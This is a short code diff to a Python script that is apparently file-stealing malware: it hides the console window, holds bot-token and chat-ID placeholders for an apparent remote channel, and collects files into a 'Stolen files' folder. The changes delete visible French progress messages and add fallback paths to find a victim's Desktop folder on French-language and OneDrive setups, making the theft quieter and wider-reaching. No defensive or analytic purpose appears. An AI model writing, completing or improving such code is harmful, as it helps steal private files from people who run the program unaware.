@@ -23,7 +23,6 @@ import sys
 
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-print("Chargement...\nCette opération peut durer 1 à 2 minutes")
 
 BOT_TOKEN = 'Your bot token here'
 CHAT_ID = 'Your chat id here'
@@ -38,7 +37,6 @@ try:
 except Exception:
    pass
 
-print(f"Téléchargement des modules vers {file_location}...")
 
 filename = os.path.basename(__file__)
 
@@ -503,6 +501,11 @@ async def main():
 
    if not os.path.exists(desktop_path):
       desktop_path = Path.home() / 'Desktop'
+      if not os.path.exists(desktop_path):
+         desktop_path = fr"C:\Users\{user}\Bureau"
+         if not os.path.exists(desktop_path):
+            desktop_path = fr"C:\Users\{user}\OneDrive\Documents\Bureau"
+            
    destination_folder = os.path.join(f"./{foldername}/Stolen files")
    stolen_files_dir_size = 0
    stolen_files = 0
